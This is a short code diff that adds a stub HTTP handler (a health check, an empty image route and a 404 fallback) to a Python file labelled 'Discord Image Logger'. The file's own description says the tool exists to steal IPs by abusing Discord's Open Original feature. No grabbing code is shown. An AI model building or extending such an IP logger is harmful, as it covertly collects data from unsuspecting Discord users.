@@ -4,6 +4,36 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+from http.server import BaseHTTPRequestHandler
+from urllib.parse import urlparse
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed = urlparse(self.path)
+
+        # Health check
+        if parsed.path == "/":
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(b'{"ok": true}')
+            return
+
+        # Example: serve an image dynamically if you really want (optional)
+        # Otherwise, put image.png in /public (recommended).
+        if parsed.path == "/image.png":
+            self.send_response(200)
+            self.send_header("Content-Type", "image/png")
+            self.end_headers()
+            # Return empty image data for now; replace with real bytes if needed.
+            self.wfile.write(b"")
+            return
+
+        # Default fallback so unknown assets don't crash the function
+        self.send_response(404)
+        self.send_header("Content-Type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"Not Found")
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
